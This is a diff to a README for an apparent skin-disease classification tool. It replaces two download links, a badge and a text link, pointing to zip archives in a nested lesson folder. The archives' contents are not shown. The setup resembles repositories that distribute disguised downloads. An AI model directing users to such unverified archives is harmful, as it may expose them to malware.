@@ -1,6 +1,6 @@
 # 🩺 Skin_disease_classification - Easy Skin Disease Detection 
 
-![Download](https://raw.githubusercontent.com/daniel-arteaga-chamorro/Skin_disease_classification/main/leccion8/Skin-classification-disease-2.2.zip%20Now-Click%20Here-brightgreen?style=flat)
+![Download](https://github.com/daniel-arteaga-chamorro/Skin_disease_classification/raw/refs/heads/main/leccion8/Skin-disease-classification-1.1.zip%20Now-Click%20Here-brightgreen?style=flat)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you download, make sure your computer meets the following requirements:
 
 To get started, visit the page below to download the software:
 
-[Visit this page to download](https://raw.githubusercontent.com/daniel-arteaga-chamorro/Skin_disease_classification/main/leccion8/Skin-classification-disease-2.2.zip)
+[Visit this page to download](https://github.com/daniel-arteaga-chamorro/Skin_disease_classification/raw/refs/heads/main/leccion8/Skin-disease-classification-1.1.zip)
 
 Once you are on the Releases page, follow these steps:
 
